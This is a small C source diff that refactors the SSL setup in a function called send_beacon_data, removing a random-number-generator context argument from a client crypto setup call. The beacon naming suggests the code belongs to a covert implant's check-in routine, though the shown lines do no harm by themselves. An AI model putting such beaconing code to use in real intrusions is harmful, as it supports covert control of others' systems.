@@ -310,7 +310,6 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	unsigned char* next_beacon_data = NULL;
 	
 	//ssl related variables for proxy
-	ctr_drbg_context ctr_drbg;
 	ssl_context ssl;
 	ssl_session ssn;
 
@@ -595,7 +594,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//setup ssl
 	DLX(4, printf("\tSetup crypto\n"));
-	if(crypt_setup_client( &ctr_drbg, &ssl, &ssn, &sock ) != SUCCESS)
+	if(crypt_setup_client(&ssl, &ssn, &sock ) != SUCCESS)
 	{
 		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
 		retval = FAILURE;
